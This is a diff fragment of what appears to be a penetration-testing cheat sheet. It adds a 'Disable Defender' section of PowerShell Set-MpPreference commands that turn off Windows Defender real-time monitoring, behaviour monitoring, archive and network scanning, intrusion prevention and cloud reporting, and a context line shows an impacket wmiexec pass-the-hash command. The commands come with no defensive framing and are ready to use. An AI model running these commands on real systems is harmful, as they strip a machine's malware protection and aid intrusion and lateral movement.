@@ -399,4 +399,18 @@ proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes 
 ```
 
 
-	
+#### Disable Defender 
+
+```powershell
+shell Set-MpPreference -DisableRealtimeMonitoring $true 
+shell Set-MpPreference -EnableRealtimeMonitoring $true
+Set-MpPreference -DisableArchiveScanning $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableIntrusionPreventionSystem $true
+Set-MpPreference -DisableScanningNetworkFiles $true
+Set-MpPreference -MAPSReporting 0
+Set-MpPreference -DisableCatchupFullScan $True
+Set-MpPreference -DisableCatchupQuickScan $True
+```
+
